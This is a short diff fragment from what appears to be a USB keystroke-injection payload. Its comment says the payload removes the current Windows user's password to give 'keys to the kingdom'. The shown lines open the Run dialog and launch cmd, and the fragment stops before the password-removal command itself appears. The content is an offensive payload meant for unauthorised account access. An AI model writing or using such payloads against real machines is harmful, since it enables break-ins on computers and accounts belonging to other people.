@@ -1,6 +1,6 @@
 REM This payload will remove the current users password on windows and give you keys to the kingdom
 
-WINDOWS
+GUI r
 STRING cmd
 ENTER
 DELAY 500
